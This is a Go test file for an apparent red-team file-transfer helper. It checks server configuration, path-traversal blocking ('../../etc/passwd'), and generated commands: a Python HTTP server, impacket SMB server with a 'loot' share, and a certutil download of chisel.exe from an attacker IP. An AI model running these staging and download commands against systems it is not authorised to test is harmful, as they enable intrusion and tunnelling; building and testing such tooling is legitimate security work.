package core

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateFileTransferConfig_F31(t *testing.T) {
	tmpDir := t.TempDir()

	// Valid builtin config
	validCfg := FileTransferServerConfig{
		Name:        "Staging Server",
		Kind:        FileServerKindBuiltin,
		Directory:   tmpDir,
		BindAddress: "0.0.0.0",
		Port:        8000,
	}
	if err := ValidateFileTransferConfig(validCfg); err != nil {
		t.Fatalf("expected valid config to pass, got %v", err)
	}

	// Missing directory
	badDir := validCfg
	badDir.Directory = filepath.Join(tmpDir, "nonexistent-folder-xyz")
	if err := ValidateFileTransferConfig(badDir); err == nil {
		t.Fatal("expected error for non-existent directory")
	}

	// File instead of directory
	filePath := filepath.Join(tmpDir, "test.txt")
	if err := os.WriteFile(filePath, []byte("hello"), 0o600); err != nil {
		t.Fatal(err)
	}
	fileCfg := validCfg
	fileCfg.Directory = filePath
	if err := ValidateFileTransferConfig(fileCfg); err == nil {
		t.Fatal("expected error when directory points to a regular file")
	}

	// Invalid port 0
	badPort := validCfg
	badPort.Port = 0
	if err := ValidateFileTransferConfig(badPort); err == nil {
		t.Fatal("expected error for port 0")
	}

	// Invalid IP
	badIP := validCfg
	badIP.BindAddress = "not-an-ip!!"
	if err := ValidateFileTransferConfig(badIP); err == nil {
		t.Fatal("expected error for invalid bind IP")
	}
}

func TestResolveSafeHostedPath_BlocksTraversal_F31(t *testing.T) {
	tmpDir := t.TempDir()

	// Safe file
	safe, err := ResolveSafeHostedPath(tmpDir, "tools/linpeas.sh")
	if err != nil {
		t.Fatalf("expected safe relative path, got error: %v", err)
	}
	if !strings.HasPrefix(safe, tmpDir) {
		t.Fatalf("expected resolved path %q inside root %q", safe, tmpDir)
	}

	// Directory traversal attempt
	if _, err := ResolveSafeHostedPath(tmpDir, "../../etc/passwd"); err == nil {
		t.Fatal("expected traversal path ../../etc/passwd to be blocked")
	}

	// Null byte attempt
	if _, err := ResolveSafeHostedPath(tmpDir, "file\x00.txt"); err == nil {
		t.Fatal("expected null byte path to be blocked")
	}
}

func TestListHostedFiles_F31(t *testing.T) {
	tmpDir := t.TempDir()
	sampleFile := filepath.Join(tmpDir, "linpeas.sh")
	if err := os.WriteFile(sampleFile, []byte("#!/bin/bash\nid\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	entries, err := ListHostedFiles(tmpDir)
	if err != nil {
		t.Fatalf("ListHostedFiles failed: %v", err)
	}
	if len(entries) != 1 || entries[0].Name != "linpeas.sh" || entries[0].Size != int64(len("#!/bin/bash\nid\n")) {
		t.Fatalf("unexpected entries: %+v", entries)
	}
}

func TestBuildFileServerCommand_F31(t *testing.T) {
	tmpDir := "/opt/tools"

	py3 := BuildFileServerCommand(FileTransferServerConfig{
		Kind:        FileServerKindPython3,
		Directory:   tmpDir,
		BindAddress: "10.10.14.5",
		Port:        8080,
	})
	if !strings.Contains(py3, "python3 -m http.server 8080 --bind 10.10.14.5") {
		t.Fatalf("unexpected python3 command: %s", py3)
	}

	updog := BuildFileServerCommand(FileTransferServerConfig{
		Kind:      FileServerKindUpdog,
		Directory: tmpDir,
		Port:      8443,
		UseTLS:    true,
	})
	if !strings.Contains(updog, "updog -d \"/opt/tools\" -p 8443 --ssl") {
		t.Fatalf("unexpected updog command: %s", updog)
	}

	smb := BuildFileServerCommand(FileTransferServerConfig{
		Kind:      FileServerKindImpacketSMB,
		Directory: tmpDir,
		ShareName: "loot",
	})
	if !strings.Contains(smb, "impacket-smbserver -smb2support loot") {
		t.Fatalf("unexpected impacket-smb command: %s", smb)
	}
}

func TestGenerateTargetTransferCommands_F31(t *testing.T) {
	cmdSet := GenerateTargetTransferCommands(FileTransferCommandOptions{
		Filename:     "chisel.exe",
		LocalIP:      "10.10.14.9",
		Port:         8000,
		TargetOS:     "all",
		SHA256:       "abcd1234",
		MD5:          "ef567890",
		EnableUpload: true,
	})

	if cmdSet.URL != "http://10.10.14.9:8000/chisel.exe" {
		t.Fatalf("unexpected URL: %s", cmdSet.URL)
	}

	foundTools := make(map[string]string)
	for _, m := range cmdSet.Methods {
		foundTools[m.ID] = m.Command
	}

	required := []string{"linux-curl", "linux-wget", "win-iwr", "win-certutil", "win-smb-copy", "linux-verify-sha256", "win-verify-certutil"}
	for _, id := range required {
		if _, ok := foundTools[id]; !ok {
			t.Fatalf("expected transfer method %q to be generated", id)
		}
	}

	if !strings.Contains(foundTools["win-certutil"], "certutil.exe -urlcache -split -f \"http://10.10.14.9:8000/chisel.exe\"") {
		t.Fatalf("unexpected certutil command: %s", foundTools["win-certutil"])
	}
	if !strings.Contains(foundTools["linux-verify-sha256"], "abcd1234") {
		t.Fatalf("expected sha256 verification command to embed expected digest, got: %s", foundTools["linux-verify-sha256"])
	}
}
